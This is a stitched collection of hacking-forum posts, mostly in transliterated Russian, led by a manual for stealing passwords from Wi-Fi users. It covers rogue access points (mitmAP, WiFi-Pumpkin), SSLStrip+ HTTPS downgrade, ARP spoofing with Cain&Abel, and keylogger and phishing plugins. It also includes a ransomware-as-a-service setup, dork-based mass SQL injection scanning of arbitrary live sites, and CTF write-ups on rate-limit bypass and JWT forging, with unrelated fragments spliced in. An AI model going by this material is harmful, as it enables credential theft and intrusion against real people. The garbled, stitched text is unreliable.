Manual po perekhvatu parolei cherez wi-fi  Sposob 1. mitmAP  mitmAP - eto nebol'shoi skript na Python3, kotoryi avtomatiziruet sozdanie besprovodnoi tochki dostupa i zapuskaet instrumenty dlia sniffinga trafika, v tom chisle pozvoliaiushchie chastichno obkhodit' HSTS.  Programma postavliaetsia vmeste s SSLStrip+ i dns2proxy i avtomaticheski ikh zapuskaet, blagodaria chemu i dostigaetsia obkhod HTTPS / HSTS. S mitmAP v etot protsess ne nuzhno vnikat', no esli vy khotite sdelat' chto-to podobnoe, naprimer, s create_ap, to oznakom'tes' s <<Instruktsiei po ispol'zovaniiu SSLStrip+ i dns2proxy dlia obkhoda HSTS>>.   mitmAP pozvoliaet prakticheski bez vvoda komand (i ponimaniia mekhanizma obkhoda HTTPS) ispol'zovat' samye effektivnye na segodniashnii moment sposoby ponizheniia HTTPS do HTTP. V moikh testakh parol' v otkrytom vide peredavalsia dlia vk.com, yandex.ru, mail.ru.  Etot skript sdelan v dvukh variantakh - dlia raboty v Kali Linux ili v Raspberry PI[ IMG].  Skript dolzhen rabotat' na proizvodnykh Debian, esli ustanovit' zavisimosti; no ne budet rabotat', naprimer, v Arch Linux / BlackArch iz-za vybrannogo avtorom sposoba zapuska sluzhb.  Davaite zhe pristupim k samomu interesnomu  Skachivaem skript   git clone https://github.com/xdavidhu/mitmAP.git    cd mitmAP/  Zapustim ego  Kod:  sudo python3 mitmAP.py  Skript nachniot s voprosa:   Install/Update dependencies? Y/n:   Esli zapuskaete pervyi raz, to soglasites', t.e. nazhmite Enter. V dal'neishem mozhno vybirat' n (net).  Sleduiushchii vopros:   Please enter the name of your wireless interface (for the AP):  Perevod: vvedite imia vashego besprovodnogo interfeisa (dlia TD). Esli vy ne znaete imia vashikh interfeisov, to v drugom okne vypolniaem komandu:   ip a  Ona pokazhet vse setevye interfeisy vashei sistemy. A komanda   sudo iw dev  pokazhet tol'ko besprovodnye setevye interfeisy.  V Kali Linux besprovodnoi interfeis obychno nazyvaetsia wlan0 (a esli ikh dva, to vtoroi imeet imia wlan1).  Dalee   Please enter the name of your internet connected interface:  V Kali Linux provodnoi interfeis obychno nazyvaetsia eth0. Takzhe dlia podkliucheniia k Internetu mozhno ispol'zovat' vtoruiu Wi-Fi kartu.   Use SSLSTRIP 2.0? Y/n:  V nastoiashchee vremia, kogda znachitel'naia, esli uzhe ne bol'shaia, chast' trafika peredaiotsia cherez HTTPS (v zashifrovannom vide), eta optsiia kraine rekomenduetsia.  Teper'   Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf' Y/n: Esli zapuskaete pervyi raz, to eto nuzhno sdelat' obiazatel'no. Pri posleduiushchikh zapuskakh, esli vy ne sobiraetes' meniat' nastroiki TD, to mozhno vybrat' n (t.e. <<net>>).  Nastroika TD:   Please enter the SSID for the AP:   Dalee:   Please enter the channel for the AP:  Zatem:  Enable WPA2 encryption? y/N  Esli vy vkliuchite shifrovanie, to dlia podkliucheniia k vashei TD nuzhno budet vvodit' parol'. Dlia nashikh tselei vybiraem <<net>>.  Posledniaia nastroika TD:   Set speed limit for the clients? Y/n: Teper':   Start WIRESHARK on wlan0? Y/n:   Spoof DNS manually? y/N:   Esli vy vyberite <<da>>, to vam nuzhno budet vvesti kolichestvo saitov, dlia kotorykh vy budete podmeniat' DNS otvety, a zatem vvesti domen kazhdogo saita i IP, na kotoroi dolzhny ukazyvat' DNS otvety. Krome etogo, vam nuzhno podgotovit' virtual'nye khosty s fishingovymi stranitsami na serverakh, kuda budut perenapravleny pol'zovateli. Mozhno oboitis' bez etogo. No esli pol'zovatel' ne budet avtorizovyvat'sia na saitakh, to my ne uznaem ego parol' (tol'ko kukiz). Fishingovye stranitsy podvedut pol'zovatelia k vvodu dannykh. Bolee podrobno ob etoi atake vy smozhete prochitat' v <<Instruktsii po rabote s DNSChef: analiz DNS zaprosov, fal'sifikatsiia DNS otvetov, perenapravlenie na fal'shivye kopii saitov>>.  mitmAP vyvodit perekhvachennye dannye, v tom chisle loginy i paroli v svoiom glavnom okne  V svoei papke ona sozdaiot direktoriiu logs s dvumia failami: mitmap-sslstrip.log i mitmap-wireshark.pcap. V pervom faile soderzhat'sia sobrannye dannye v tekstovom vide. A vtoroi prednaznachen dlia analiza v programme Wireshark.  Obratite vnimanie: chto pri perezapuske programmy eti faily zatiraiutsia! T.e. esli vy namerevaetes' analizirovat' eti faily pozdnee, to vam nuzhno pozabotit'sia ob ikh peremeshchenii ili pereimenovanii, inache oni budut prosto udaleny.  Esli vy vybrali zapusk okna Wireshark i otobrazhenie peredavaemykh izobrazhenii s pomoshch'iu Driftnet, to vy takzhe ikh smozhete ispol'zovat' dlia monitoringa peredavaemykh dannykh v real'nom vremeni.  Chto zh, davaite pereidem k analizu dannykh  Wireshark imeet ochen' detal'nyi fil'tr dannykh, s ego raznoobraziem vy smozhete oznakomit'sia na stranichke ofitsial'noi dokumentatsii https://www.wireshark.org/docs/dfref/  Privedu primery neskol'kikh khodovykh fil'trov.  Dlia otobrazheniia v Wireshark vsekh HTTP zaprosov, peredannykh metodom POST:   http.request.method == "POST"    Dlia otobrazheniia dannykh peredannykh ili poluchennykh s opredelionnogo domena (vmesto <URL> vvedite interesuiushchii domen, naprimer, vk.com):   http.host=="<URL>"    Dlia poiska stroki vo vsiom potoke peredavaemykh dannykh ispol'zuetsia sleduiushchii fil'tr (vmesto <stroka> vvedite stroku, kotoruiu vy khotite iskat'):   frame contains "<stroka>"   Dlia otobrazheniia kukiz v Wireshark:   http.cookie    Esli vas interesuet kukiz s opredelionnymi imenem, to ispol'zuite:   http.cookie contains "<imia_kuki>"    Dlia pokaza zaprosov v Wireshark, peredannykh metodom GET ili POST:   http.request.uri contains "?" or http.request.method=="POST"    Esli vy khotite naiti dannye obmena s FTP serverom, to v Wireshark mozhete ispol'zovat' odin iz sleduiushchikh fil'trov:  [/code]ftp  ili   tcp.port==21 || tcp.port==20  Khotia mitmAP zadeistvuet interesnye programmy, vy vsegda mozhete provodit' analiz dannykh drugimi instrumentami. Naprimer, esli vy khotite ispol'zovat' Bettercap, to nuzhno uchityvat', chto:  ARP spufing ne nuzhen  Ne nuzhno provodit' obnaruzhenie klientov  Ne nuzhno vkliuchat' SSLStrip.  T.e. komanda mozhet imet' vid:   sudo bettercap -X -I wlan0 -S NONE --no-discovery  Ili   sudo bettercap -X -I wlan0 -S NONE --no-discovery --proxy --no-sslstrip  Dlia vykliucheniia programmy nuzhno dva raza bystro nazhat' CTRL+C. Napomniu, chto pri povtornom zapuske programma zatriot faily s poluchennymi dannymi. T.e. vam nuzhno ikh peremestit' v druguiu papku, esli vy khotite pozzhe provesti ikh analiz.  Sposob 2.  Dlia etogo sposoba nam ponadobitsia windows i sniffer (Wireshark, Cain&Abel, Intercepter-ng i t.d.) My budem ispol'zovat' Cain&Abel, skachat' ego mozhno vot zdes'. Zapuskaem programmu ustanovki, vezde zhmiom NEXT, po okonchaniiu budet predlozheno ustanovit' draiver WinPcap, ustanavlivaem. Podkliuchaemsia k internetu cherez router-zhertvu sniffinga, zapuskaem sniffer, perekhodim na vkladku Wireless i iz vypadaiushchego spiska vybiraem svoiu wi fi kartochku.   Dalee perekhodim vo vkladku Sniffer, posmotrim kto sidit v internete, nazhimaem na knopku start/stop sniffer, potom +, otkroetsia okno, nazhimaem OK.   Poiaviatsia komp'iutery kotorye podkliucheny v dannyi moment.   Perekhodim vo vkladku APR, nazhimaem knopku start/stop apr, dalee +, otkroetsia okno, vydeliaem router 192.168.1.1 i nazhimaem OK.   Nachalsia zakhvat paketov   Perekhodim vo vkladku Passwords i smotrim perekhvachennye paroli, eto zaimiot kakoe - to vremia, vsio zavisit ot aktivnosti pol'zovatelei (skrin). Estestvenno paroli ia postiral, daby kto ne uznal.   Sposob 3. WiFi-Pumpkin  Nu tut u nas voobshche zhara :D  Eto tselaia moshennicheskaia tochka dostupa s graficheskim interfeisom i bogatym funktsionalom.  Tsel'iu atak s moshennicheskoi tochkoi dostupa (Rogue Wi-Fi Access Point Attack) iavliaetsia ne parol' ot Wi-Fi seti, a dannye, peredavaemye cherez etu tochku dostupa. V otnoshenii etikh dannykh vypolniaetsia ataka posrednika - ataka chelovek-poseredine (Man-In-The-Middle attacks). V peredavaemykh dannykh mozhno poimat' uchiotnye dannye (loginy i paroli) ot veb-saitov, uznat', kakie saity byli poseshcheny, kakie dannye vvodil pol'zovatel' i drugoe. Nastroika Rogue Access Point zakliuchaetsia v nastroike besprovodnoi tochki dostupa - protsess nichem ne otlichalsia, esli by vy khoteli nachat' razdavat' besprovodnoi internet so svoego komp'iutera na Linux. No moshennicheskoi eio delaiut posleduiushchie ataki posrednika. Imeiutsia programmy, kotorye avtomatiziruiut protsess sozdaniia failov nastroiki besprovodnoi tochki dostupa, a takzhe obespechivaiut pravil'nuiu marshrutizatsiiu trafika. K takim programmam, otnositsia, naprimer, create_ap. Eti zhe samye deistviia, no eshchio dopolnitel'no zapuskaia ataki chelovek-poseredine, delaet programma mitmAP.   WiFi-Pumpkin - eto eshchio odna programma dlia nastroiki besprovodnoi moshennicheskoi tochki dostupa. Eio osobennost'iu iavliaetsia graficheskii interfeis, kotoryi eshchio bol'she uproshchaet ataku Rogue Access Point.  V platformu vstroeny plaginy, kotorye sobiraiut dannye i vypolniaiut razlichnye ataki.  Dlia ustanovki WiFi-Pumpkin v Kali Linux  git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git  cd WiFi-Pumpkin  chmod +x installer.sh  sudo ./installer.sh --install    Zapusk delaetsia komandoi:   wifi-pumpkin  Obratite vnimanie, chto pri popytke zapuska ot obychnogo pol'zovatelia (ne ruta) programma ne rabotaet.  Posle zapuska otkryvaetsia takoi interfeis  Pereidem v nastroiki i pomeniaite imia tochki dostupa (ia vybral WiFi-Home)  V Activity Monitor settings (nastroikakh monitora aktivnosti) ia stavliu galochki na HTTP-Requests (veb-zaprosy), HTTP-Authentication (uchiotnye dannye s veb-saitov) i Pumpkin-Proxy.  Vo vkladke Plugins (plaginy) vyberite, chto vam vazhnee. Pumpkin-Proxy pozvoliaet ispol'zovat' razlichnye gotovye resheniia (kilogery, BeEF, vnedrenie koda i t.d. Zato SSLStrip+ v pare s dns2proxy pozvoliaiut obkhodit' HTTPS i perekhvatyvat' namnogo bol'she uchiotnykh dannykh.   Vo vkladke Plugins imeetsia kratkoe opisanie kazhdogo plagina. Perevod etikh opisanii vy naidiote na stranichke https://kali.tools/?p=387.  Kogda nastroika zavershena, nazhmite Start.  Mozhno uvidet' perekhvachennye uchiotnye dannye dlia saitov vk.com i mail.ru  Vo vkladke Pumpkin-Proxy imeiutsia sleduiushchie plaginy:  beef - Etot modul' vnedriaet kod JavaScript, kotoryi <<podtsepliaet na>> BeEF. V kachestve optsii nuzhno ukazat' adres .js faila.  dnsspoof - Podmeniaet otvety Domain Name Server (DNS). V nastroika nuzhno ukazat', dlia kakogo domennogo imeni, kakoi vozvrashchat' IP.  downloadspoof - Podmeniaet zagruzhaemye cherez HTTP faily na ikh vredonosnye versii.  dump_post_data - Sobiraet zakhvachennye HTTP POST dannye so stranits vkhoda.  html_inject - Vnedriaet proizvol'nyi HTML kod v uiazvimuiu veb-stranitsu.  inverted_internet - Dobavliaet HTML stil' dlia invertirovaniia soderzhimogo tega body.  js_inject Vnedriaet - v stranitsu JavaScript kod, v kachestve optsii nuzhno ukazat' URL adres faila s kodom.  keylogger - Zapisyvaet vse nazhatiia knopok s vremennymi metkami v massiv i otpravliaet atakuiushchemu.  replaceImages - Zameniaet vse izobrazheniia na ukazannuiu v nastroikakh kartinku.  shakepage - Plagin dobavliaet JavaScript s effektom vstriaski stranitsy.  stickycookie - Monitoring trafika na zagolovki Cookie i Set-Cookie.  upsidedownternet - Perevorachivaet vverkh nogami izobrazheniia na saitakh.  U nekotorykh iz nikh imeiutsia optsii. Dlia izmeneniia optsii plagina nazhmite Settings naprotiv nazvaniia plagina. Vse eti plaginy budut srabatyvat' tol'ko na veb-saitakh bez HTTPS.  Posmotrim rabotu etikh plaginov na primere keylogger, t.e. my budem perekhvatyvat' nazhatiia klavish.  Ostanovite rabotu TD, esli ona zapushchena, pereidite vo vkladku Plugins, vyberite tam Pumpkin-Proxy  Teper' otmetim zhelaemye dlia ispol'zovaniia plaginy Pumpkin-Proxy:   Zapuskaem tochku dostupa. Pereidite vo vkladku Activity-Monitor, tam kliknite na PumpkinProxy:   V etom okne otobrazhaiutsia dannye o rabote plagina i perekhvachennaia informatsiia.  Dipolnitel'nye instrumenty WiFi-Pumpkin    Krome svoego glavnogo naznacheniia - fal'shivaia tochka dostupa, WiFi-Pumpkin mozhet vypolniat' drugie funktsii, blagodaria vstroennym moduliam. K etim moduliam otnosiatsia:  Deautentifikatsiia klientov. Nachinaetsia so skanirovaniia, zatem iz spiska klientov mozhno vybrat' liubogo, kogo nuzhno otsoedinit' ot Wi-Fi  Slezhenie za zaprosami zondirovaniia (Probe Request) - oni pokazyvaiut, kakie klienty k kakim tochkam dostupa pytaiutsia podkliuchit'sia  DHCP Starvation  Fal'shivye obnovleniia Windows  Fishingovyi veb-server i drugi

RAASnet es un proyecto escrito en Python que se creo para demostrar lo facil que es desarrollar ransomware y ver como funciona. El script funciona en Windows, Linux y MacOS. En Windows se recomienda compilar payload.py en formato EXE para hacerlo mas portatil. Ni que decir tiene que el uso de esta herramienta debe limitarse a la investigacion y analisis de este tipo de amenazas, nunca para danar un tercero y/o con proposito lucrativo. Instalacion Descarga e instala la ultima version de Python 3.Luego ejecuta:git clone https://github.com/leonv024/RAASNet.gitpip3 install -r requirements.txtpython3 RAASNet.pyEn Linux podriamos necesitar ejecutar los siguientes paquetes:sudo apt install python3-tk python3-pil python3-pil.imagetk libgeoip1 libgeoip-dev geoip-binRegistroEl primer paso evidentemente es registrarnos en la plataforma de RAAS (Ransomware-As-A-Service), en este caso contra la URL https://zeznzo.nl/req.py en el cloud de Google:  Tambien podemos atacar directamente al servicio onion (Tor) del operador: hplqdv5fo3vw3fjyamyer7yuc7xtvtop2j3fipc7psf3pxvhoqjoqkid.onion Si todo ha ido bien podremos loggearnos y nos..

Vzlamyvaem IoT (domashnie elektronnye predmety).    HomePwn (https://github.com/Telefonica/HomePWN) - eto platforma, kotoraia predostavliaet funktsii dlia audita i testirovaniia ustroistv, kotorye sotrudniki kompanii mogut ispol'zovat' v svoei povsednevnoi rabote i v odnoi i toi zhe rabochei srede.    On prednaznachen dlia poiska ustroistv v dome ili ofise, ispol'zovaniia opredelennykh uiazvimostei dlia chteniia ili otpravki dannykh na eti ustroistva. Blagodaria moshchnoi biblioteke modulei vy mozhete ispol'zovat' etot instrument dlia zagruzki novykh funktsii i ispol'zovaniia ikh na samykh raznykh ustroistvakh.    Ustanovka:  $ git clone https://github.com/Telefonica/HomePWN  $ cd HomePWN  $ sudo ./install.sh    Ispol'zovanie:  $ sudo python3 homePwn.pyH
Wapiti - Web Vulnerability Scanner
Web razrabotchik (Python/JS) Z/P ne ukazana

Kak parsit' i skanirovat' saity po dorkam dlia sql injection  Ia uzhe pisal pro kombain XAttacker https://github.com/Moham3dRiahi/XAttacker , no segodnia razberiom drugoi nabor utilit i sposobov Takzhe ia uzhe pisal kak sozdavat' privatnye dorki, no po traditsii ostavliu vam failik s dorkami  Kak naiti SQL Injection s pomoshch'iu dorkov Ustanovka:  apt-get install python3-pip python3-dev python-dev  pip3 install aiohttp asyncio bs4 dnspython tqdm datetime requests socksipy-branch httplib2    git clone https://github.com/v3n0m-Scanner/V3n0M-Scanner.git  cd V3n0M-Scanner/  python3 setup.py install --user  Vospol'zuemsia skanerom uiazvimostei. Dlia etogo vybiraem punkt 1 i otvechaem na riad voprosov ot skanera.    1. Choose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com :    Zdes' mozhno ukazat' konkretnyi domen, kotoryi my zhelaem protestirovat'. Naprimer, test.ru.  Esli interesuiut eshche i subdomeny, to vvodim *.test.ru. Mozhno sdelat' poisk uiazvimostei vo vsem russkom segmente interneta: *.ru . A esli vvesti prosto *, to poisk budet osushchestvliat'sia voobshche po vsem saitam. V svoem primere ia vyberu zvezdochku.    2. Choose the number of random dorks (0 for all.. may take awhile!)    Zdes' neobkhodimo vybrat' kolichestvo dorkov, kotoroe budet ispol'zovat'sia pri skanirovanii. Dorkov v baze bolee 14 tysiach. Esli vybrat' 0, to skript budet iskat' po vsei baze. Takoi poisk mozhet zatianut'sia na neskol'ko chasov. Mozhno ukazat' konkretnoe kolichestvo dorkov, togda skript budet vybirat' ikh iz bazy v sluchainom poriadke. Dlia svoego primera ia vyberu 200.    3. Enter no. of threads, Between 50 and 500    Kolichestvo potokov skanirovaniia. Mozhno vybrat' ot 50 do 500. Ia vyberu 50.    4. Enter no. of Search Engine Pages to be scanned per d0rk, Between 20 and 100, increments of 20. Ie> 20:40:60:80:100    Zdes' nuzhno ukazat' kolichestvo stranits v poiskovoi sisteme, vyvod kotorykh budet analizirovat' skript. Chem bol'she chislo, tem bol'she rezul'tatov, no pri etom uvelichitsia vremia skanirovaniia. Dlia primera ia vybral 20.    Dalee zapuskaetsia protsess avtomaticheskogo gugl khakinga.  Posle zaversheniia protsedury poiska skript predlagaet nam reshit' chto zhe delat' s tem, chto on tak tshchatel'no iskal. Naprimer, na skrinshote nizhe vidno, chto bylo naideno 1485 ssylok, a posle ochistki dublikatov i prochego musora ostalos' vsego lish' 172.  No vse li oni iavliaiutsia uiazvimymi? Proveriaem!    Vyberem punkt [1] SQLi Testing   Skript avtomaticheski proverit na SQL Injection vse naidennye ssylki i vydast rezul'tat so spiskom uiazvimykh URL.   V moem sluchae skript nashel 10 uiazvimostei i opredelil tip dlia kazhdoi. Kak pokazala praktika, tip uiazvimosti MySQL Classic - eto Union Based SQLi. Dalee mozhno poluchat' dostup k bazam dannykh cherez SQLMap. No mozhno i pochuvstvovat' sebia nastoiashchim khakerom i poprobovat' poluchit' dannye ruchkami v brauzere :)    Mozhno proverit' ssylki na uiazvimost' k XSS:  [4] XSS Testing    Skript v meniu testirovaniia chasto gliuchit i posle ocherednoi proverki nas mozhet vykinut' v glavnoe meniu bez sokhraneniia rezul'tata. Poetomu luchshe srazu vospol'zovat'sia funktsiei sokhraneniia rezul'tatov v fail:  [5] Save valid Sorted and confirmed vuln urls to file

1. Avtorizovat'sia v SIP kliente (imeia Login, Parol' i Server provaidera predostavliaiushchego uslugi SIP telefonii). 2. Osushchestvit' zvonok s p.1 na ukazannyi v funktsii nomer. 3.... Otvetit' zakazchikuThe post funktsiia  dlia Python3 (Biudzhet: 3000  R) first appeared on Kleinburd Projects.

This tool gives blue teams, SOC's, researchers and companies  the ability to detect the active mutations of their domains,  thus preventing the use of these domains in fraudulent  activities, such as phishing and smishing.  For this, Typodetect allows the use of the latest available  version of the TLDs (Top Level Domains) published on the  IANA website, the validation of decentralized domains in  Blockchain DNS and the malware reports in DoH services  (DNS over HTTPS) .  For the ease of the user, Typodetect delivers the report  in JSON format by default, or in TXT format, depending on  how the user selects and shows on the screen a summary of  the mutations generated, the active domains and the reports  detected with Malware or decentralized domains.InstallationClone this repository with:  git clone https://github.com/Telefonica/typodetect  Run setup for installation:  python3 pip install -r requirements.txt  Running TypoDetectInside the TypoDetect directory:  python3 typodetect.py -h  usage: typodetect... #database #doh #json #malware #phishing #typodetect

HackTheBox - APT  00:00 - Intro 01:42 - Start of nmap and poking at the webserver 09:45 - Looking into MSRPC, showing MSF info overflow which is why I had historically ignored it 14:10 - Poking at RPC with Impacket's RPCMap 18:30 - Converting a RPC Script to get IPv6 address from Python2 to Python3 20:15 - Using nmap to scan the IPv6 Address 22:30 - Showing how I would enumerate a Firewall, nothing works here but something I do. 27:30 - Finding SMB accepts anonymous users and contains an Active Directory Backup 32:45 - Using Impacket's SecretsDump to extract the NTDS.DIT with password last set, user status, and history 41:15 - Using KerBrute to enumerate valid users on the box based upon the AD Backup 49:15 - Using PyKerbrute to bruteforce Henry.Vinson's account 1:04:00 - Using Socat + CrackMapExec to enumerate IPv6 (if i updated CME, it would be able to do IPv6) 1:08:00 - Using Impacket's reg.py to query Windows Registry remotely from linux 1:17:30 - Using Evil-WINRM to run WinPEAS/Seatbelt and bypass AMSI 1:26:00 - Some good information talking about LmCompatibilityLevel and NetNTLMv1 1:29:15 - Unintended method. Using Defender to make a SMB Request then decrypting the NetNTLM-v1 hash 1:30:50 - Editing responder to use a pre-set challenge (1122334455667788 used by Crack.SH) 1:35:30 - Modifying RoguePotato to allow for IPv6 1:41:15 - RoguePotato flagged by defender... Some weird AV Bypass... 1:48:30 - Showing the Compiler flags will make RoguePotato undetectable by defender 1:58:05 - RoguePotato working, lets start modifying impacket to allow us to stand up an RPC Server 2:21:03 - Start debugging our impacket studd with pdb set_trace 2:30:00 - Got the NetNTLM v1 hash from Rogue Potato 2:39:50 - Cleaning up notes https://vk.com/video163931991_456239737

Hack The Box. Na ee pri mere ia pokazhu, kak obkho dit' X-Rate-Limit-Limit pri ska niro vanii veb-sai ta. Zaod no ty uzna esh', kak s pomoshch'iu XSS v Markdown i deseri ali zatsii ob' ekta S# poluchit' uda len noe vypol nenie koda. Pos le chego porabo taem s tekh nologi ei GraphQL i pod dela em uchet nuiu zapis' System v Windows pri pomoshchi pri vile gii SeImpersonate Privilege. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov IP mashiny -- 10.10.10.217, dobav liaem ego v /etc/hosts. 10.10.10.217 cereal.htb I perekho dim k ska niro vaniiu por tov: ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 Re zul' tat raboty skrip taV rezul' tate raboty skrip ta uzna em spi sok otkry tykh por tov i rabota iushchikh sluzhb: port 22 (TCP) -- sluzh ba SSH; port 80 (HTTP) -- veb-ser ver Microsoft IIS/10.0; port 443 (HTTPS) -- veb-ser ver Microsoft IIS/10.0. SSH poka chto pro pus kaem, pos kol' ku uchet nykh dan nykh u nas net. Veb-ser ver s 80-go por ta perenap ravlia et na 443-i port. Pri etom v SSL-ser tifika te uka zano domen noe imia source.cereal.htb -- tozhe dobav liaem ego v /etc/hosts. 10.10.10.217 source.cereal.htb Skanirovanie veba Te per' vypol niaem zap ros v bra uze re, i nas pereno sit s 80-go por ta na 443-i, zatem zas tavlia iut pod tver dit', chto my pri nima em ris ki, svia zan nye s bezopas nost'iu. Opas nost' budet pro iskho dit' kak raz ot nas, tak chto bez prob lem pod tverzhda em. I popada em na for mu avto riza tsii. For ma avto riza tsii na sai te cereal.htbEs li zhe obra tit' sia po nai den nomu domen nomu ime ni, to poluchim oshib ku Server Error in '/' Application. Oshib ka na sai te source.cereal.htbNam ne dos tupno poch ti nichego inte res nogo, a zna chit, sle duet pri beg nut' k perebo ru katalo gov. Dlia eto go est' takie prog rammy, kak dirsearch, DIRB i gobuster, kotoryi ia i ispol' zuiu, pos kol' ku on pokazal sebia kak samyi bys tryi. Vot koman da, kotoruiu ia ispol' zoval: gobuster dir -t 128 -u https:/ / cereal. htb/ -k -w / usr/ share/ seclists/ Discovery/ Web- Content/ raft- large- words- lowercase. txt -x php, html, aspx --timeout 30s A vot chto ozna chaet kazh dyi parametr: dir -- ska niro vanie direk torii i fai lov; -t [] -- koliches tvo potokov; -u [] -- URL-adres dlia ska niro vaniia; -k -- ne pro veriat' ser tifikat; -w [] -- slo var' dlia perebo ra; --timeout [] -- vre mia ozhi daniia otve ta; -x [] -- iskat' fai ly so sle duiushchi mi ras shireni iami (uka zyva em ASPX, pos kol' ku tselevoi veb-ser ver rabota et na Microsoft IIS). No pri popyt ke pereb rat' skry tye katalo gi na sai te cereal.htb my polucha em ban, chto mozhet ozna chat' nalichie WAF. Davai pro verim, tak li eto. Dlia eto go otpra vim zap ros na avto riza tsiiu i perekh vatim ego v Burp, pos le chego perenap ravim v Repeater (kom binatsiia Ctrl + R) i pos motrim otvet. Zap ros v Burp RepeaterV otve te vidim zagolov ki X-Rate-Limit-Limit i X-Rate-Limit-Remaining. Dan nye zagolov ki soob shchaiut, chto na piat' minut u nas osta los' 149 zap rosov. Mozh no pop robovat' oboi ti ogra niche nie, vsta viv v zap ros sle duiushchie zagolov ki: X-Originating-IP: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Real-Ip: 127.0.0. X-Host: 127.0.0.1 X-Forwared-Host: 127.0.0.1 Iz eto go sra botal X-Real-Ip: esli dobavit' etot zagolo vok, to v otve te budut otsuts tvo vat' khedery X-Rate-Limit-Limit i X-Rate-Limit-Remaining. Zap ros v Burp Repeater s ispol' zovani em zagolov ka X-Real-IpSka niru em pov torno, uzhe s ispol' zovani em X-Real-Ip (optsiia -H), i stal kiva emsia s dru goi prob lemoi: ser ver na zap rosy nesushches tvu iushchikh stra nits ne otve chaet kodom oshib ki, a rados tno voz vra shchaet 200 (<<Uspeshnyi rezul' tat>>). gobuster dir -t 128 -u https:/ / cereal. htb/ -k -w / usr/ share/ seclists/ Discovery/ Web- Content/ raft- large- words- lowercase. txt -x php, html, aspx --timeout 30s -H 'X-Real-Ip: 127. 0. 0. 1' --wildcard V takom slu chae sto it vyb rat' dru goi kri terii otsen ki, k pri meru raz mer otve ta v bai takh -- dlia sushches tvu iushchei i nesushches tvu iushchei stra nitsy on budet raz nym. Dlia ska niro vaniia voz' mem ffuf, pos kol' ku on ume et iskliu chat' iz vyvoda otve ty v zavisi mos ti ot ikh raz mera (optsiia -fs). ffuf -H 'X-Real-Ip: 127. 0. 0. 1' -w / usr/ share/ seclists/ Discovery/ Web- Content/ raft- large- words- lowercase. txt -u https:/ / cereal. htb/ FUZZ -fs 1948 Re zul' tat ska niro vaniia katalo gov s pomoshch'iu ffufNa khodim tol' ko odnu stra nitsu, kotoraia pred polozhi tel' no dol zhna pri nimat' opre delen nye paramet ry. Dlia ska niro vaniia dru gogo sai ta, gde nam vstre tilas' oshib ka, ispol' zuem gobuster, bla go tam net nikakikh blo kirov shchikov. gobuster dir -t 128 -u https:/ / source. cereal. htb/ -k -w / usr/ share/ seclists/ Discovery/ Web- Content/ raft- large- words- lowercase. txt -x php, html, aspx --timeout 30s Re zul' tat ska niro vaniia katalo gov s pomoshch'iu ffufNam popal sia katalog .git, a eto zna chit, chto my mozhem popytat' sia ska chat' ves' repozi torii. Tochka vkhoda Dlia zag ruzki repozi tori ev ia obych no ispol' zuiu paket skrip tov dvcs-ripper. Zapus kaem rip-git so sle duiushchi mi argu men tami: -s -- ne pro veriat' ser tifikat; -v -- ves ti logiro vanie; -u -- URL repozi toriia. . / rip- git. pl -s -v -u https://source.cereal.htb/.git/ Re zul' tat ska niro vaniia Git-repozi toriiaDa vai glia nem isto riiu kom mitov. Dlia ana liza i raz bora repozi tori ev Git ia obych no ispol' zuiu Gitk. Pros matri vaia kod Services/UserService.cs, nakhodim sek ret JWT, a tak zhe dan nye, iz kotorykh for miru etsia JWT, -- eto ID pol' zovate lia i data cherez sem' dnei. Kod Services/UserService.cs (kliuch JWT) Kod Services/UserService.cs (for mirova nie JWT)JSON Web Token sos toit iz trekh chas tei: zagolov ka (header), polez noi nag ruzki (payload) i pod pisi. Zagolo vok i polez naia nag ruzka pred stav liaiut soboi ob' ekty JSON, a nag ruzka mozhet byt' liuboi -- eto imen no te kri tiches kie dan nye, kotorye pereda iutsia pri lozhe niiu. U zagolov ka est' sle duiushchie polia: alg -- algo ritm, ispol' zuemyi dlia pod pisi/shif rovaniia. Iavlia etsia obia zatel' nym kliu chom; typ -- tip tokena. Eto pole dol zhno imet' zna chenie JWT; cty -- tip soder zhimogo. Tre tii ele ment vychis liaet sia na osno vanii per vykh dvukh i zavisit ot vyb ranno go algo rit ma. Tokeny mogut byt' pereko diro vany v kom pak tnoe pred stav lenie: k zagolov ku i polez noi nag ruzke pri menia etsia algo ritm kodiro vaniia Base64-URL, pos le chego dobav liaet sia pod pis' i vse tri ele men ta raz delia iutsia toch kami. Vot pri mer tokena, vzia tyi iz Vikipe dii. Pri mer struk tury JWTPop robu em sge neri rovat' sebe token. Dlia eto go nam ponado bit sia libo pri lozhe nie jwt_tool, libo ser vis jwt.io. Ia ispol' zoval jwt_tool. Tak kak s zagolov kom vse iasno, davai raz berem sia s dan nymi: kliuch name budet soder zhat' iden tifika tor 1, a kliuch exp -- tekushchuiu datu plius sem' dnei. date -d "+7 days" +%s echo -n '{ "name": "1", "exp":[ data]} ' | base64 -w0 ; echo echo -n '{ "alg": "HS256", "typ": "JWT"} ' | base64 -w0 ; echo python3 jwt_ tool. py -b -S hs256 -p 'secretlhfIH& FY*#oysuflkhskjfhefesf' [zagolovok].[dannye]. Ge neri rova nie JWTU nas est' token dlia dos tupa, no stra nitsa requests tre buet paramet ry v for mate JSON, o chem svi detel' stvu iut klass Request v fai le Models/Request.cs i fun ktsiia requestCereal iz fai la ClientApp/src/_services/request.service.js. Klass Request Fun ktsii requestCereal i getCerealRequestsAna lizi ruia iskhodni ki dalee, uzna em i sami paramet ry iz fai la ClientApp/src/AdminPage/AdminPage.jsx. Fun ktsiia render

